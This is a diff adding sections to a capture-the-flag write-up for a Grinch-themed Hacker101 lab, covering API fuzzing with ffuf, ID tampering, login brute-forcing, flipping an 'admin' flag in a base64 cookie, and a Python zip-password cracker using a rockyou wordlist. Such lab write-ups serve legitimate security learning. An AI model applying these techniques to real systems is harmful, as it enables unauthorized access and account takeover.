@@ -21,6 +21,8 @@ Going to `https://c7e947b150b633c436c698e00271600a.ctf.hacker101.com/s3cr3t-ar3a
 In Burp it doesn't show, but in Elements inspector, it shows the flag.</br>
 
 ## Solution 3rd flag
+The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!</br>
+
 In `/s3cr3t-ar3a`, it also shows a next-page `apps-home`</br>
 In `/apps-home`, it shows the boxes of all the different challenges:</br>
 ```
@@ -76,6 +78,8 @@ One line item stands out with the size: `eyJpZCI6MX0=`</br>
 Going to `/people-rater/entry/?id=eyJpZCI6MX0=` it will show the flag.</br>
 
 ## Solution 4th flag
+Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.</br>
+
 The next challenge is the `/swag-shop` to try and find the Grinch's personal details.</br>
 Checking the source code, it looked like there are api's, f.e. `/api/stock`.</br>
 Fuzz to see if there are other api's: `ffuf -w api-endpoints-res.txt -u https://ca184d43d40fce19e231bfb1b49700b2.ctf.hacker101.com/swag-shop/api/FUZZ -fc 404`</br>
@@ -105,8 +109,70 @@ There is 1 user with an active session, user: `C7DCCE-0E0DAB-B20226-FC92EA-1B904
 Let's use this value as a uuid.</br>
 Going to `https://ca184d43d40fce19e231bfb1b49700b2.ctf.hacker101.com/swag-shop/api/user/?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043` will show the details of the Grinch and the flag.</br>
 
+## Solution 5th flag
+Try and find a way past the login page to get to the secret area.</br>
 
+This challenge shows a log in page and there is not much more given than it is a secure login.</br>
+When logging in with a random user it will show `Invalid Username`</br>
+This means we can bruteforce an existing user.</br>
+In Burp, using Turbo Intruder we found the user: `access`</br>
 
+Now we can try to bruteforce the password.</br>
+The password is `computer`</br>
+When logging in, it provides a securlogin cookie: `securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D`
+Based on `%3D` at the end, we know that the cookie is URL encoded and then it looks like it is Base64 encoded.</br>
+When decoding the cookie, we get: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`</br>
+Let's forward the request with the cookie, but first change the cookie to: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}`, where admin is true:</br>
+`eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3D%3D`</br>
+When logged in, it shows a zip-file: `my_secure_files_not_for_you.zip`</br>
+To unzip any of the files, a password is needed, but at least it shows `flag.txt` and `xxx.jpg`, so we're close.</br>
+
+Online I found a Python script to bruteforce the zip file:</br>
+```
+#!/bin/python3
+import zipfile
+
+def crack_password(password_list, obj):
+    # tracking line no. at which password is found
+    idx = 0
+
+    # open file in read byte mode only as "rockyou.txt"
+    # file contains some special characters and hence
+    # UnicodeDecodeError will be generated
+    with open(password_list, 'rb') as file:
+        for line in file:
+            for word in line.split():
+                try:
+                    idx += 1
+                    obj.extractall(pwd=word)
+                    print("Password found at line", idx)
+                    print("Password is", word.decode())
+                    return True
+                except:
+                    continue
+    return False
+
+password_list = "rockyou-75.txt"
+
+zip_file = "my_secure_files_not_for_you.zip"
+
+# ZipFile object initialised
+obj = zipfile.ZipFile(zip_file)
+
+# count of number of words present in file
+cnt = len(list(open(password_list, "rb")))
+
+print("There are total", cnt,
+      "number of passwords to test")
+
+if crack_password(password_list, obj) == False:
+    print("Password not found in this file")
+```
+The rockyou-75.txt contains the password `hahahaha`.</br>
+Open the file flag.txt and you've got the flag.</br>
+
+## Solution 6th flag
+Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?</br>
 
 
 
